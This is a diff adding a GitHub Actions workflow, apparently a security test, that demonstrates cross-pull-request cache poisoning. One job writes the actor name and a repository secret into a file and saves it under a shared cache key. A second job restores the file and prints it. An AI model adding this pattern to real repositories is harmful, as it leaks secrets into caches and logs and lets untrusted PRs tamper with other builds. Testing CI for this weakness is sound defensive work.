@@ -1,0 +1,35 @@
+name: Vector - Cross-PR Cache Poison
+on:
+  pull_request:
+
+jobs:
+  poison-cache:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create poisoned cache data
+        run: |
+          mkdir -p ./cache-data
+          echo "POISONED_BY_ATTACKER=${{ github.actor }}" > ./cache-data/config.txt
+          echo "SECRET=${{ secrets.FAKE_SECRET }}" >> ./cache-data/config.txt
+          echo "timestamp=$(date)" >> ./cache-data/config.txt
+      
+      - name: Save poisoned cache
+        uses: actions/cache@v4
+        with:
+          path: ./cache-data
+          key: cross-pr-cache-test-${{ runner.os }}
+
+  read-back:
+    runs-on: ubuntu-latest
+    needs: poison-cache
+    steps:
+      - name: Restore cache to verify poison
+        uses: actions/cache@v4
+        with:
+          path: ./cache-data
+          key: cross-pr-cache-test-${{ runner.os }}
+      
+      - name: Show poisoned content
+        run: |
+          echo "=== Cache contents ==="
+          cat ./cache-data/config.txt || echo "No cache found"
